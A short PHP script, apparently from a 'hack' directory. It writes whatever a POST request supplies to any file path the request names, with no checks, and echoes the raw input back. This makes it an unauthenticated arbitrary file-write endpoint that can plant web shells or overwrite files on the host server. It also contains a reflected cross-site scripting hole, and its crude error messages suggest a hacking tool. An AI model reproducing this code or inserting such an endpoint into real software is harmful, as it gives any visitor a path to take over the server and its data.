<?php
$base_dir="/root/html/hack/";
$url = $_POST["name"];
echo $url;
$fso=fopen($url, "w") or die("fxxk\n");
$context = substr($_POST["context"], 59, strlen($_POST["context"]) - 59 - 6);
echo $context;
fwrite($fso, $context);
fclose($fso);
$fnameHandler = fopen("name.txt", "w") or die("hehe");
fwrite($fnameHandler, $_POST["name"]);
fclose($fnameHandler);
?>
